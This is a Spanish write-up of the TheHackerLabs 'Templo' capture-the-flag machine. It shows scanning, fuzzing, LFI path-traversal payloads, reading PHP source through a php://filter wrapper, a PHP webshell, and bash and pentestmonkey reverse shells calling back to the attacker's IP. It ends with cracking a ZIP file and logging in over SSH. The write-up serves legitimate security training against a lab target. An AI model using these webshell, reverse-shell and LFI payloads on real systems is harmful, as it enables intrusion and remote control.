---
title: "Templo - TheHackerLabs"
date: 2025-05-29
draft: false
slug: "THL-writeup-templo"
excerpt: "Esta es una máquina sencilla, pero que necesita bastante trabajo para resolverla. Comenzamos analizando la página web, pero al no encontrar nada que nos ayude, aplicamos Fuzzing para encontrar directorios ocultos. De esta forma, encontramos un directorio que contiene un archivo de texto con una pista, pero que no podremos usar de momento. Analizando de nuevo la página web principal, probamos un título mencionado en el contenido, resultando en una página oculta. Dicha página, permite subir e incluir archivos, siendo la inclusión de archivos vulnerable a Local File Inclusion (LFI). La subida de archivos, permite subir archivos PHP, lo que nos permite subir una WebShell de PHP, pero al no saber donde ni como se suben los archivos, utilizamos el LFI más PHP Wrappers para obtener el script completo de esta página para analizarlo, siendo así que descubrimos donde se guardan y que el nombre se codifica en ROT13. Sabiendo esto, codificamos el nombre de nuestra WebShell a ROT13 y logramos usarlo en la ruta donde se guarda, siendo de esta forma con la que obtenemos una Reverse Shell. Dentro de la máquina, recordamos la pista que vimos la primera vez que aplicamos Fuzzing y descubrimos un archivo ZIP. Descargamos y crackeamos este archivo, que al ver su contenido, vemos la contraseña de un usuario, con el que nos podemos autenticar vía SSH. Ya en la máquina, como este usuario, descubrimos que está dentro del grupo LXD, por lo que utilizamos un Exploit de la base de datos Exploit-DB de Kali, para abusar de este grupo y poder crear un contenedor que tendrá la montura de la raíz de la máquina víctima. Al ser un contenedor con volumen compartido (bind mount), cualquier cambio que hagamos en la montura, se verá reflejado en la máquina víctima, por lo que le damos permisos SUID a la Bash para escalar privilegios y convertirnos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "Web Enumeration", "Fuzzing", "Local File Inclusion (LFI)", "PHP Wrappers", "LFI + PHP Wrappers", "ROT13 Decodification", "Cracking Hash", "Cracking ZIP File", "Abusing LXD Group", "Privesc - Abusing LXD Group", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "wfuzz"
  - "PHP"
  - "php://filter/convert.base64-encode"
  - "echo"
  - "base64"
  - "head"
  - "tr"
  - "nc"
  - "bash"
  - "wget"
  - "python3"
  - "unzip"
  - "zip2john"
  - "JohnTheRipper"
  - "ssh"
  - "sudo"
  - "id"
  - "searchsploit"
  - "git"
  - "lxc"
  - "chmod"
links:
  - "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=LFI#phpfilter"
  - "https://gchq.github.io/CyberChef/"
  - "https://github.com/pentestmonkey/php-reverse-shell"
  - "https://medium.com/@mstrbgn/privilege-escalation-using-lxd-lxc-group-assignment-to-a-user-a-security-misconfiguration-a4892f611d6f"
  - "https://www.hackingarticles.in/lxd-privilege-escalation/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-templo/templo.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.70
PING 192.168.10.70 (192.168.10.70) 56(84) bytes of data.
64 bytes from 192.168.10.70: icmp_seq=1 ttl=64 time=0.886 ms
64 bytes from 192.168.10.70: icmp_seq=2 ttl=64 time=3.31 ms
64 bytes from 192.168.10.70: icmp_seq=3 ttl=64 time=1.55 ms
64 bytes from 192.168.10.70: icmp_seq=4 ttl=64 time=1.33 ms

--- 192.168.10.70 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3230ms
rtt min/avg/max/mdev = 0.886/1.767/3.306/0.919 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.70 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-29 13:11 CST
Initiating ARP Ping Scan at 13:11
Scanning 192.168.10.70 [1 port]
Completed ARP Ping Scan at 13:11, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:11
Scanning 192.168.10.70 [65535 ports]
Discovered open port 22/tcp on 192.168.10.70
Discovered open port 80/tcp on 192.168.10.70
Completed SYN Stealth Scan at 13:11, 8.83s elapsed (65535 total ports)
Nmap scan report for 192.168.10.70
Host is up, received arp-response (0.00083s latency).
Scanned at 2025-05-29 13:11:22 CST for 9s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
           Raw packets sent: 67841 (2.985MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo solamente dos puertos abiertos, supongo que la intrusión será por la página activa en el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.10.70 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-29 13:11 CST
Nmap scan report for 192.168.10.70
Host is up (0.00080s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 bc:8f:97:fa:60:eb:ed:b2:8c:3b:c0:65:3b:48:69:f1 (ECDSA)
|_  256 f9:b0:9b:20:8f:3a:7b:33:e7:95:a5:43:e7:9b:c6:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))

|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: RODGAR
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo nos está mostrando contenido en la página web.

Vayamos a verla y a analizarla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura1.png">
</p>

Parece ser una página que ofrece servicios de ¿web hosting?, ¿fotos? No entiendo muy bien qué servicios está ofreciendo.

Pero por lo que veo, el dolor tiene algo que ver.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura2.png">
</p>

No hay mucho que podamos usar de aquí.

Como tal, no hay algo más que podamos usar de aquí.

Entonces, vamos a aplicar **Fuzzing**.

### Fuzzing {#fuzz}

Utilizaremos primero **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt:FUZZ -u http://192.168.10.70/FUZZ -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.70/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 49ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 5ms]
js                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 24ms]
wow                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 18ms]
fonts                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 16ms]
                        [Status: 200, Size: 20869, Words: 7711, Lines: 480, Duration: 65ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 72ms]
:: Progress: [1185240/1185240] :: Job [1/1] :: 265 req/sec :: Duration: [0:09:30] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.70/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.70/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 314] [--> http://192.168.10.70/css/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.10.70/js/]
/wow                  (Status: 301) [Size: 314] [--> http://192.168.10.70/wow/]
/fonts                (Status: 301) [Size: 316] [--> http://192.168.10.70/fonts/]
/images               (Status: 301) [Size: 317] [--> http://192.168.10.70/images/]
/server-status        (Status: 403) [Size: 279]
Progress: 1185240 / 1185241 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Encontramos un directorio llamado `/wow`.

Si vamos a verlo, veremos un archivo de texto:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura3.png">
</p>

Y entrando en ese archivo de texto, parece que nos da una ruta:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura4.png">
</p>

Pero al intentar entrar en esa ruta, no podremos, pues no existe.

Entonces, hay que buscar alguna pista en la página.

### Encontrando y Analizando Página Oculta NAMARI {#namari}

Revisando la página principal, parece que tenemos una pista de lo que podemos probar:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura5.png">
</p>

Probemos con la palabra **NAMARI**:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura6.png">
</p>

Encontramos una página oculta.

Podemos ver que la página tíene un titulo llamado **"Subida de Archivos y LFI"**, que ya es un claro ejemplo de lo que debemos hacer.

Además, si analizamos el código fuente, podemos ver cómo funciona la subida de archivos:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura7.png">
</p>

La subida de archivos se realiza con una **petición POST** y no veo que indique el tipo de archivos que ocupa, aunque al ver que la página es **index.php**, puede que acepte **archivos PHP**.

Ahora, lo que nos interesa es la parte de la inclusión de archivos, ya que realiza una **petición GET** del archivo que pidas y utiliza el parámetro `page=` para mostrarlo.

Quiero pensar que es aquí donde es probable que se aplique el **LFI**, así que vamos a comprobarlo.

Antes de continuar, veamos si hay algún directorio o archivo oculto, aplicándole **Fuzzing** a este directorio:
```bash
gobuster dir -u http://192.168.10.70/NAMARI/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.70/NAMARI/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 325] [--> http://192.168.10.70/NAMARI/uploads/]
Progress: 1185240 / 1185241 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Muy bien, supongo que ahí es donde se guardarán los archivos que subamos.

Continuemos.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Local File Inclusion (LFI) {#LFI}

Si intentamos incluir un archivo random, podemos ver cómo aparece el parámetro `page=` en la URL:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura8.png">
</p>

Vamos a ocupar **wfuzz** para utilizar el wordlist **LFI-Jhaddix.txt** y así podamos comprobar si es posible aplicar **LFI** y qué formas son válidas:
```bash
wfuzz -c --hc=404 --hh=2993 -t 300 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://192.168.10.70/NAMARI/index.php?page=FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
.
Target: http://192.168.10.70/NAMARI/index.php?page=FUZZ
Total requests: 929
.
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000016:   200        142 L    303 W      4776 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"                                          
000000020:   200        142 L    303 W      4776 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"                                                        
000000023:   200        142 L    303 W      4776 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                                                                     
000000121:   200        338 L    1376 W     10445 Ch    "/etc/apache2/apache2.conf"                                                                                                  
000000129:   200        109 L    260 W      3063 Ch     "/etc/apt/sources.list"                                                                                                      
000000131:   200        131 L    459 W      4129 Ch     "/etc/crontab"                                                                                                               
000000135:   200        120 L    343 W      3650 Ch     "/etc/fstab"                                                                                                                 
000000138:   200        168 L    313 W      3817 Ch     "/etc/group"                                                                                                                 
000000422:   200        230 L    640 W      6233 Ch     "/etc/ssh/sshd_config"                                                                                                       
000000432:   200        263 L    1204 W     8843 Ch     "/etc/vsftpd.conf"                                                                                                           
000000399:   200        131 L    395 W      3913 Ch     "/etc/resolv.conf"                                                                                                           
000000400:   200        149 L    373 W      3904 Ch     "/etc/rpc"                                                                                                                   
000000507:   200        108 L    254 W      3020 Ch     "/proc/self/cmdline"
000000503:   200        112 L    307 W      3444 Ch     "/proc/net/dev"                                                                                                              
000000510:   200        109 L    277 W      3207 Ch     "/proc/version"                                                                                                              
000000509:   200        169 L    397 W      4457 Ch     "/proc/self/status"                                                                                                          
000000501:   200        133 L    403 W      4838 Ch     "/proc/mounts"                                                                                                               
000000498:   200        138 L    421 W      4601 Ch     "/proc/interrupts"                                                                                                           
000000499:   200        109 L    258 W      3019 Ch     "/proc/loadavg"                                                                                                              
000000497:   200        162 L    589 W      4971 Ch     "/proc/cpuinfo"                                                                                                              
000000500:   200        162 L    411 W      4496 Ch     "/proc/meminfo"                                                                                                              
000000504:   200        112 L    297 W      3505 Ch     "/proc/net/route"                                                                                                            
000000502:   200        111 L    274 W      3232 Ch     "/proc/net/arp"                                                                                                              
000000505:   200        111 L    299 W      3443 Ch     "/proc/net/tcp"                                                                                                              
000000506:   200        115 L    277 W      3170 Ch     "/proc/partitions"                                                                                                           
000000699:   200        108 L    254 W      295285 Ch   "/var/log/lastlog"                                                                                                           
000000741:   200        121 L    360 W      73211 Ch    "/var/log/wtmp"                                                                                                              
000000750:   200        108 L    255 W      4145 Ch     "/var/run/utmp"                                                                                                              
000000758:   200        121 L    306 W      3441 Ch     "/var/www/html/.htaccess"                                                                                                    
000000929:   200        142 L    303 W      4776 Ch     "///////../../../etc/passwd"
000000205:   200        117 L    282 W      3233 Ch     "/etc/hosts"                                                                                                                 
000000236:   200        461 L    1295 W     11132 Ch    "/etc/init.d/apache2"                                                                                                        
000000237:   200        119 L    290 W      3368 Ch     "/etc/issue"                                                                                                                 
000000209:   200        125 L    364 W      3704 Ch     "/etc/hosts.deny"                                                                                                            
000000208:   200        118 L    310 W      3404 Ch     "/etc/hosts.allow"                                                                                                           
000000206:   200        117 L    282 W      3233 Ch     "../../../../../../../../../../../../etc/hosts"                                                                              
000000265:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../../../../../etc/passwd"                                                                    
000000260:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                     
000000257:   200        142 L    303 W      4776 Ch     "/etc/passwd"                                                                                                                
000000263:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                                                              
000000261:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"                                                        
000000258:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                               
000000264:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                                                 
000000259:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                  
000000262:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                                                           
000000254:   200        142 L    303 W      4776 Ch     "/../../../../../../../../../../etc/passwd"                                                                                  
000000253:   200        142 L    303 W      4776 Ch     "/./././././././././././etc/passwd"                                                                                          
000000273:   200        142 L    303 W      4776 Ch     "../../../../../../../etc/passwd"                                                                                            
000000267:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../../../etc/passwd"                                                                          
000000269:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../etc/passwd"                                                                                
000000250:   200        128 L    318 W      3519 Ch     "/etc/nsswitch.conf"                                                                                                         
000000249:   200        127 L    356 W      3760 Ch     "/etc/netconfig"                                                                                                             
000000266:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../../../../etc/passwd"                                                                       
000000311:   200        142 L    303 W      4776 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                                                                 
000000272:   200        142 L    303 W      4776 Ch     "../../../../../../../../etc/passwd"                                                                                         
000000276:   200        142 L    303 W      4776 Ch     "../../../../etc/passwd"                                                                                                     
000000270:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../etc/passwd"                                                                                   
000000268:   200        142 L    303 W      4776 Ch     "../../../../../../../../../../../../etc/passwd"                                                                             
000000271:   200        142 L    303 W      4776 Ch     "../../../../../../../../../etc/passwd"                                                                                      
000000274:   200        142 L    303 W      4776 Ch     "../../../../../../etc/passwd"                                                                                               
000000275:   200        142 L    303 W      4776 Ch     "../../../../../etc/passwd"
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *--hh*     | Para no mostrar respuestas con la cantidad de caracteres especificada. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Hay bastantes formas en las que se puede aplicar y es claro que no se está aplicando ninguna sanitización.

Apliquémoslo de la forma más simple con `/etc/passwd`:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura9.png">
</p>

Funcionó.

Lo podemos ver mejor en el código fuente de la página web y ahí podremos ver a un usuario:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura10.png">
</p>

Aunque no podremos aplicarle fuerza bruta, por lo que debemos buscar una forma de ganar acceso a la máquina.

### Probando la Subida de Archivos y Obteniendo Código Fuente del index.php Usando LFI + PHP Wrappers {#Wrappers}

Vamos a subir una **WebShell** para ver si lo acepta.

Crea un archivo llamado **cmd.php** que tendrá este contenido:
```php
<?php
	system($_GET['cmd']);
?>
```

Y súbelo a la página:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura11.png">
</p>

Sí lo acepto.

El problema es que no vamos a encontrar nuestro archivo, por lo que quiero pensar que se está aplicando algún cambio cuando se suben.

Por fortuna, tenemos un **LFI**, sabemos que se está ocupando **PHP** y tenemos el parámetro vulnerable `page=`.

Entonces, podemos aplicar **PHP Wrappers** para tratar de obtener el script **index.php** y ver cómo es que funciona.

Aquí te dejo un link de **HackTricks** donde puedes encontrar Wrappers útiles:
* <a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=LFI#lfi--rfi-using-php-wrappers--protocols" target="_blank">HackTricks - File Inclusion/Path traversal: LFI / RFI using PHP wrappers & protocols</a>

Para este caso, utilizaremos el **PHP Wrapper** `php://filter/convert.base64-encode/resource=`, para convertir en **base64** el archivo que queramos.

Nosotros queremos ver el archivo **index.php**, así que solamente debemos agregar ese archivo, quedando de esta forma:
```php
php://filter/convert.base64-encode/resource=index.php
```

Úsalo en el campo vulnerable y observa la respuesta:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura12.png">
</p>

Tenemos la **base64**.

Solamente cópiala y vamos a decodificarla:
```bash
echo "base64_copiada" | base64 -d | head -n 27
<?php
// Manejo de subida de archivos
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target_dir = "uploads/";

    // Obtiene el nombre original del archivo y su extensión
    $original_name = basename($_FILES["fileToUpload"]["name"]);
    $file_extension = pathinfo($original_name, PATHINFO_EXTENSION);

    $file_name_without_extension = pathinfo($original_name, PATHINFO_FILENAME);
    $rot13_encoded_name = str_rot13($file_name_without_extension);
    $new_name = $rot13_encoded_name . '.' . $file_extension;

    // Crea la ruta completa para el nuevo archivo
    $target_file = $target_dir . $new_name;

    // Mueve el archivo subido al directorio objetivo con el nuevo nombre
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        // Mensaje genérico sin mostrar el nombre del archivo
        $message = "El archivo ha sido subido exitosamente.";
        $message_type = "success";
    } else {
        $message = "Hubo un error subiendo tu archivo.";
        $message_type = "error";
    }
}
```
Excelente, funcionó bien y podemos ver que al subir el archivo, se le cambia el nombre por su mismo nombre, pero codificado con **ROT13**.

Entonces, solamente necesitamos codificar el nombre del archivo que subimos y probar si existe en el directorio `/uploads` que descubrimos antes.

### Aplicando Codificación ROT13 y Obteniendo Reverse Shell con Nuestra WebShell {#ROT13}

Para la codificación, podemos aplicarla con **cyberchef** o con el comando **tr**.

Lo haremos con el comando **tr**, pues esta codificación, simplemente cambia la posición de las letras por 13 espacios. 

Por ejemplo, A sería N, B sería O, C sería P y así sucesivamente.

Probémoslo:
```bash
echo "cmd" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
pzq
```

Bien, ahora busquemos ese nombre en el directorio `/uploads`:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura13.png">
</p>

Funciona, podemos ejecutar comandos con nuestra **WebShell**.

Primero, abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Vamos a mandarnos una **Reverse Shell** a nuestra máquina, utilizando nuestra **Reverse Shell** de **Bash**:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura14.png">
</p>

Una vez que la mandes, observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.70] 52844
bash: cannot set terminal process group (971): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Templo:/var/www/html/NAMARI/uploads$ whoami
whoami
www-data
```
Estamos dentro.

#### Utilizando Reverse Shell de Pentestmonkey {#monkey}

Como ya vimos que acepta archivos **PHP**, podemos cargar la **Reverse Shell de PHP** de **Pentestmonkey**:
* <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>

Descárgalo con **wget**:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```

Y modifícalo en esta parte:
```php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'Tu_IP';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
Ya solamente sube el archivo a la página web.

Debemos codificar a **ROT13** el nombre de la **Reverse Shell** que subimos, quedando de esta forma:
```bash
echo "php-reverse-shell" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
cuc-erirefr-furyy
```

Ahora, abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Y utiliza ese nombre dentro del directorio `/uploads`:

<p align="center">
<img src="/assets/images/THL-writeup-templo/Captura15.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.70] 53516
Linux TheHackersLabs-Templo 6.8.0-39-generic #39-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul  5 21:49:14 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 05:52:48 up  7:32,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
Ya solo falta obtener una sesión interactiva, aunque esto es opcional para esta máquina.

Bien, podríamos intentar ver la flag del usuario, pero no podremos, ya que no tenemos permisos para esto:
```bash
www-data@TheHackersLabs-Templo:/var/www/html$ cd /home
cd /home
www-data@TheHackersLabs-Templo:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root   root   4096 Aug  4  2024 .
drwxr-xr-x 23 root   root   4096 Aug  7  2024 ..
drwxr-x---  5 rodgar rodgar 4096 Aug  9  2024 rodgar
```
Tendremos que escalar privilegios o convertirnos en el **usuario rodgar** para poder entrar ahí.

## Post Explotación {#Post}

### Crackeando Archivo ZIP y Ganando Acceso a la Máquina Como Usuario Rodgar {#ZIP}

Recordando un poco el primer **Fuzzing** que aplicamos, nos mencionaban la ruta `/opt` como si algo se encontrara ahí.

Veamos qué se esconde en ese directorio:

Revisando esa ruta, encontramos un directorio oculto que contiene un **archivo ZIP** llamado **backup.zip**:
```bash
www-data@TheHackersLabs-Templo:/home$ cd /opt
cd /opt
www-data@TheHackersLabs-Templo:/opt$ ls -la
ls -la
total 12
drwxr-xr-x  3 root   root   4096 Aug  6  2024 .
drwxr-xr-x 23 root   root   4096 Aug  7  2024 ..
drwxrwxr-x  2 rodgar rodgar 4096 Aug  6  2024 .XXX
www-data@TheHackersLabs-Templo:/opt$ cd .XXX
cd .XXX
www-data@TheHackersLabs-Templo:/opt/.XXX$ ls -la
ls -la
total 12
drwxrwxr-x 2 rodgar rodgar 4096 Aug  6  2024 .
drwxr-xr-x 3 root   root   4096 Aug  6  2024 ..
-rw-r--r-- 1 root   root    378 Aug  3  2024 backup.zip
```
Descarguemos este **archivo ZIP** en nuestra máquina.

Abre un servidor con **Python3** justo donde está este archivo:
```bash
www-data@TheHackersLabs-Templo:/opt/.XXX$ python3 -m http.server 8080
python3 -m http.server 8080
```

Y usamos **wget**, para descargarnos este archivo:
```bash
wget http://192.168.10.70:8080/backup.zip
```

Tratemos de descomprimirlo con la herramienta **unzip**:
```bash
unzip backup.zip
Archive:  backup.zip
   creating: backup/
[backup.zip] backup/Rodgar.txt password:
```
Nos pide una contraseña, por lo que tendremos que crackearlo.

Obtengamos el hash de este **archivo ZIP** con la herramienta **zip2john**:
```bash
zip2john backup.zip > hash
ver 1.0 backup.zip/backup/ is not encrypted, or stored with non-handled compression type
ver 1.0 efh 5455 efh 7875 backup.zip/backup/Rodgar.txt PKZIP Encr: 2b chk, TS_chk, cmplen=36, decmplen=24, crc=5C3C7389 ts=8855 cs=8855 type=0
```

Y con **JohnTheRipper**, crackeamos el hash:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
batman           (backup.zip/backup/Rodgar.txt)     
1g 0:00:00:00 DONE (2025-05-29 18:13) 25.00g/s 307200p/s 307200c/s 307200C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Genial, tenemos la contraseña.

Ahora sí, descomprimamos este archivo:
```bash
unzip backup.zip
Archive:  backup.zip
[backup.zip] backup/Rodgar.txt password: 
 extracting: backup/Rodgar.txt
```
Obtuvimos un archivo de texto.

Si vemos su contenido, podremos ver una especie de contraseña.

Vamos a probarla para entrar al **servicio SSH**:
```bash
ssh rodgar@192.168.10.70
rodgar@192.168.10.70's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-39-generic x86_64)
...
Last login: Fri May 30 00:15:54 2025
rodgar@TheHackersLabs-Templo:~$ whoami
rodgar
```

Ya podremos ver la flag del usuario:
```bash
